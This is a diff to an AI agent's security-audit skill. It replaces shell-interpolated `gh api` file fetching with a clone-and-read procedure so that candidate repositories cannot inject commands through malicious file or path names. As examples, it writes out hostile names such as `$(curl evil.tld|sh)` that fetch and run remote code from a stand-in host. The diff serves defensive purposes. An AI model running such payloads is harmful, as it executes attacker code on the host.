@@ -9,7 +9,7 @@ effort: high
 # it is a per-turn override (the session model resumes on the next prompt), so it
 # guards the scan turn, not the whole session.
 model: sonnet
-compatibility: "Requires `gh` CLI for fetching content. WebFetch for skills.sh audit signals. Designed to run under the current Sonnet family reasoning tier — Haiku is insufficient (misses indirection attacks). The host agent platform should route via the `model: sonnet` alias (vendor-neutral) declared in the security-auditor agent frontmatter, and this skill's own `model: sonnet` pins the audit turn on direct invocation."
+compatibility: "Requires `gh` CLI for API metadata and `git` for cloning candidates before file reads. WebFetch for skills.sh audit signals. Designed to run under the current Sonnet family reasoning tier — Haiku is insufficient (misses indirection attacks). The host agent platform should route via the `model: sonnet` alias (vendor-neutral) declared in the security-auditor agent frontmatter, and this skill's own `model: sonnet` pins the audit turn on direct invocation."
 disallowed-tools:
   - Write
   - Edit
@@ -75,6 +75,73 @@ These signals **inform** your verdict — they don't determine it alone. A "Snyk
 
 Do NOT stop at frontmatter. Do NOT scan only the SKILL.md/agent.md. Read the **full content** of every file shipped with the item:
 
+### How to fetch files — clone once, read with the Read tool
+
+A git tree entry's path can contain almost any byte — only NUL is
+structurally forbidden, and `/` is a nesting convention, not an enforced
+restriction — so a malicious candidate can name a file or directory
+`` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`. That applies not only to
+files inside the item (the old `<full-file-path>` vulnerability below) but
+to the item's own path too — e.g. the `<path>` in a vendored agent's
+`<owner>/<repo>:<path>` identifier is chosen by the candidate's author,
+exactly like any other name in their tree. You build each Bash tool call by
+writing its literal command text, so a recipe that interpolates ANY such
+value into a Bash/`gh api` command — the old
+`gh api "repos/<owner>/<repo>/contents/<full-file-path>?ref=<commit-sha>"`,
+or even a `find <item-path>` scoped to the item's own directory — lets the
+shell resolve any backtick/`$()` inside that value as command substitution
+**before** the intended command itself runs. Double-quoting does not stop
+this; only never letting an untrusted value cross a shell does. This is
+CWE-78 in the one gate meant to catch the candidate before anything from it
+runs — it applies to fetching files for ALL three types below (skill /
+agent / plugin), not just skill.
+
+Fetch every file this way instead — no untrusted byte (item content, item
+path, or repo metadata) is ever written into a Bash/`gh api` command line:
+
+1. **Validate `<owner>` and `<repo>`** against GitHub's own slug charset
+   before using them anywhere — owner matches `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$`,
+   repo matches `^[A-Za-z0-9._-]{1,100}$` (the same constraint
+   `scan_repo.mjs`'s `OWNER_REPO_RE` enforces). Refuse and report if either
+   fails.
+2. **Resolve `<commit-sha>`** — nothing in this skill's Input carries one, so
+   resolve it fresh each scan: `gh api "repos/<owner>/<repo>" --jq
+   '.default_branch'`. Like any git ref, the returned `<default-branch>` can
+   legally contain shell metacharacters (backtick, `$()`, `;`, `|`, quotes —
+   `git check-ref-format` allows all of them), so validate it against the
+   same ref allowlist `inspect/SKILL.md` Step 1 uses before any further use —
+   `^[A-Za-z0-9._/-]+$`, no leading `-`, no `..`/`@{`. Refuse and report if it
+   fails. Only then call `gh api
+   "repos/<owner>/<repo>/commits/<default-branch>" --jq '.sha'` and validate
+   the result matches `^[0-9a-f]{7,40}$` before using it further.
+3. **Shallow-clone into a fresh, per-invocation directory** — `mktemp -d`
+   (shell-generated, never candidate-influenced), not a shared
+   `~/.ievo/checkouts/<owner>-<repo>/` path: `security-auditor` dispatches
+   one scan per candidate **in parallel** (`/ievo:init` Step 8), so two
+   candidates from the same repo scanning concurrently would otherwise race
+   on a shared checkout's `.git` state.
+   ```bash
+   CHECKOUT_DIR=$(mktemp -d)
+   git clone --depth 1 "https://github.com/<owner>/<repo>.git" "$CHECKOUT_DIR"
+   git -C "$CHECKOUT_DIR" fetch --depth 1 origin <commit-sha>
+   git -C "$CHECKOUT_DIR" checkout <commit-sha>
+   ```
+4. **Enumerate files** under the item's path with the **Glob tool**
+   (`pattern: "**/*"`, `path: "$CHECKOUT_DIR/<item-path>"`) — never a Bash
+   `find`/`ls`. The item's own path (e.g. a skill/agent directory name) is
+   exactly as untrusted as any file inside it; the Glob tool takes `path` as
+   a direct parameter, never shell text, so it can't be exploited even if
+   that name contains shell metacharacters.
+5. **Read every listed file with the Read tool**, passing its full path as
+   the `file_path` parameter directly — same reasoning as step 4: a direct
+   tool parameter is never interpreted as command syntax.
+
+If cloning or resolution fails (private repo, no network) do not fall back
+to per-file `gh api` fetching — that reintroduces the injection this
+replaces. Instead treat the scan as reduced-coverage: note it in
+`reasoning` (Step 5) and let the "no shortcut for low-yield scans" rule
+(Step 4) apply.
+
 ### For type=skill
 
 Files to read in full:
@@ -83,20 +150,6 @@ Files to read in full:
 3. `<path>/references/*` — every referenced file (or first 5KB if huge)
 4. `<path>/assets/*` — text/JSON/YAML assets in full; flag binaries
 5. Any file path referenced inside SKILL.md body (cross-link follow)
-
-Fetch via gh CLI. The `/contents/` endpoint is **not** recursive — for recursive listing use git trees API:
-
-```bash
-# Step 1 — list ALL files in the skill folder (recursive via git trees)
-gh api "repos/<owner>/<repo>/git/trees/<commit-sha>?recursive=1" \
-  --jq '.tree[] | select(.path | startswith("<skill-path>/")) | .path'
-
-# Step 2 — fetch each file (per path returned above)
-gh api "repos/<owner>/<repo>/contents/<full-file-path>?ref=<commit-sha>" \
-  --jq '.content' | base64 -d
-```
-
-Alternative: read from a shallow clone (`~/.ievo/checkouts/<owner>-<repo>/`) if one exists from a prior repo-indexer scan — that's faster than per-file gh api and avoids rate limits.
 
 ### For type=agent
 
@@ -321,3 +374,4 @@ Tone rules:
 - **RED requires high confidence.** Don't false-positive. If unsure, YELLOW + flag with severity=low.
 - **Report template only on RED.** Don't propose reports for YELLOW — those are install-with-awareness, not block-and-warn.
 - **Neutralize excerpts before they go public.** `report_template.body` is filed as a public, auto-rendering GitHub issue — see § Step 6's "Excerpt containment" note for the fencing rule.
+- **Never interpolate a path — a file inside the candidate, or the candidate's own item path — into a Bash/`gh api` command.** Clone once, enumerate with the Glob tool, and read with the Read tool instead — see § "How to fetch files" in Step 2. A git tree entry can legally contain shell metacharacters (backtick, `$()`, `;`, `|`, quotes); only ever passing such values as direct tool parameters, never embedded in a command string, closes that off.
